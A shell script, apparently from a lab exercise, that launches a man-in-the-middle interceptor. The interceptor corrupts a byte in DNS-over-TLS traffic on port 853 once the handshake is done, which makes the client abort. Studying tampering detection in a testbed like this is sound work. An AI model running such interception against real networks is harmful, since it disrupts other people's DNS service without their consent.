#!/bin/sh
# Attack (i): TLS record tampering — relay TCP 853 transparently until the
# handshake is done, then corrupt a byte in the first DNS-response TLS record.
# The AEAD tag will no longer verify and the client aborts with bad_record_mac.
#
# Requires the edge-router diversion to already be active (divert-on.sh).
# The interceptor captures resolver->client TCP 853 segments via pcap,
# relays them with MAC rewrite, and tampers post-handshake Application Data.

set -eu

pkill -f '[i]nterceptor' 2>/dev/null || true

ping -c 1 -W 1 172.16.1.10 >/dev/null 2>&1 || true
arping -c 1 -w 1 -I eth0 172.16.1.10 >/dev/null 2>&1 || true
ip link set eth0 mtu 65535 2>/dev/null || true

CLIENT_MAC=$(ip neigh show 172.16.1.10 2>/dev/null | awk '/lladdr/ {print $5}' | head -n 1)
if [ -z "$CLIENT_MAC" ]; then
    CLIENT_MAC=$(awk '/172.16.1.10/ {print $4}' /proc/net/arp 2>/dev/null | head -n 1)
fi

cd /lab/attacker
make

if [ -n "$CLIENT_MAC" ] && [ "$CLIENT_MAC" != "00:00:00:00:00:00" ]; then
    nohup ./interceptor --tamper-tls --client-mac "$CLIENT_MAC" > interceptor.log 2>&1 &
else
    nohup ./interceptor --tamper-tls > interceptor.log 2>&1 &
fi

sleep 1
cat interceptor.log
echo "Interceptor running in TLS tamper mode (Attack i)."
